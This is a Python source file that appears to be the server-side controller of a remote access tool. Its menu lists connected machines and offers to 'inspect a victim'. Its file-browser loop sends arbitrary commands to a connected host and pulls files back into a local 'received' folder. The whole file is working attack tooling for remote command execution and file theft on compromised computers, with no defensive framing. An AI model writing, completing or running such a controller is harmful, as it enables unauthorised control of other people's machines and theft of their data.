import socket
import threading
import os
import sys
import uuid
from prettytable import PrettyTable


class Server:

    def __init__(self, hostname, port):
        self.connections = []
        self.locking = threading.Lock()
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((hostname, port))
        self.socket.listen(5)

    def accept_connections(self):

        while True:
            socket, addr = self.socket.accept()
            with self.locking:
                self.connections.append(Client(socket, addr))

    def close_connections(self):

        with self.locking:
            for client in self.connections:
                client.close()

    def refresh_connections(self):

        index = 0
        print("-----------------------------------")
        with self.locking:
            for client in self.connections:
                if client.sync():
                    print("| %d)%s %s %4s" % (index, client.username,
                                              client.adress, "|"))
                    index += 1
                else:
                    self.connections.remove(client)
        print("-----------------------------------")

    def run(self):

        threading.Thread(target=self.accept_connections, daemon=True).start()
        while True:
            print("Items to do:\n")
            print("1) Refresh connections.")
            print("2) Inspect a victim.")
            print("0) Exit.\n")

            option = input("What u want to do? ")

            if option == "1":
                os.system('clear')
                self.refresh_connections()

            elif option == "2":
                client_id = input("Choose wisely: ")
                os.system('clear')
                try:
                    with self.locking:
                        client = self.connections[int(client_id)]
                    FileBrowser(client).run()
                except IndexError:
                    print("Index does not exist. \n")
            elif option == "0":
                self.close_connections()
                sys.exit(0)
            else:
                print("\nPerhaps you better start from the beginning.")
                input("")
                os.system("clear")


class FileBrowser:

    def __init__(self, client):
        self.client = client

    def file_transfer(self):
        name = uuid.uuid4().hex
        f = open("received/" + name, 'wb')

        while True:
            l = self.client.socket.recv(4096)
            while (l):
                if l.endswith(bytes("EOFX", "UTF-8")):
                    u = l[:-4]
                    f.write(u)
                    break
                else:
                    f.write(l)
                    l = self.client.socket.recv(4096)
            break
        f.close()

    def run(self):

        self.client.socket.sendall(bytes("1", "UTF-8"))
        client_pwd = self.client.socket.recv(4096).decode("UTF-8")
        print(client_pwd)
        exit = False
        while not exit:
            command = input("Type a command: ")
            if command == "exit":
                self.client.socket.sendall(bytes(command, "UTF-8"))
                exit = True
                os.system("clear")
            elif command == "clear":
                os.system("clear")
            else:
                self.client.socket.sendall(bytes(command, "UTF-8"))
                if command.startswith("cp"):
                    self.file_transfer()
                received = self.client.socket.recv(4096).decode("UTF-8")
                print(received)


class Client:

    def __init__(self, socket, adress):
        self.socket = socket
        self.adress = adress
        self.username = None

    def close(self):
        self.socket.shutdown(2)
        self.socket.close()

    def sync(self):
        self.socket.sendall(bytes("2", "UTF-8"))
        self.username = self.socket.recv(1024).decode("UTF-8")
        return True
